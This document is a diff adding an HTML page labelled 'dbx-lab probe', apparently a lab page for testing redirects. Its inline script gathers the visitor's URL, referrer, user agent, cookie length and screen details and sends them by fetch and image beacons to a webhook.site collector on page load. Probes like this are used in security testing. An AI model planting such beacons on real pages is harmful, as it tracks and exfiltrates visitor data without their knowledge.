@@ -1,0 +1,30 @@
+<!doctype html>
+<html><head><meta charset=utf-8><meta name=robots content=noindex>
+<title>dbx-lab probe</title>
+<style>body{font:16px/1.4 monospace;background:#111;color:#0f0;padding:1rem}h1{font-size:1.4rem}</style>
+</head><body>
+<h1>DBX-LAB PAGE LOADED (after 301 redirect)</h1>
+<p id=where></p><pre id=info></pre>
+<script>
+(function(){
+  var bin = "https://webhook.site/d2fa5428-6121-4818-b2dc-b002bac081d9";
+  var q = new URLSearchParams({
+    src: "dbxlab", t: Date.now(),
+    href: location.href, ref: document.referrer || "",
+    ua: navigator.userAgent, ck: (document.cookie||"").length,
+    lang: navigator.language, w: innerWidth, h: innerHeight
+  });
+  document.getElementById("where").textContent = location.href;
+  document.getElementById("info").textContent =
+    "UA: " + navigator.userAgent + "\nreferrer: " + (document.referrer||"(none)") +
+    "\ncookies visible to this origin: " + ((document.cookie||"").length) +
+    "\nviewport: " + innerWidth + "x" + innerHeight;
+  // beacon 1: fetch (visible in webhook.site headers: UA + Referer)
+  try { fetch(bin + "?" + q, {mode:"no-cors", credentials:"omit"}); } catch(e){}
+  // beacon 2: image (survives CSP/fetch failures)
+  try { (new Image()).src = bin + "?img=1&" + q; } catch(e){}
+  // beacon 3: navigation attempt to bin so the server-side log always has one hit
+  setTimeout(function(){ try { (new Image()).src = bin + "?late=1&ua=" + encodeURIComponent(navigator.userAgent); } catch(e){} }, 1200);
+})();
+</script>
+</body></html>
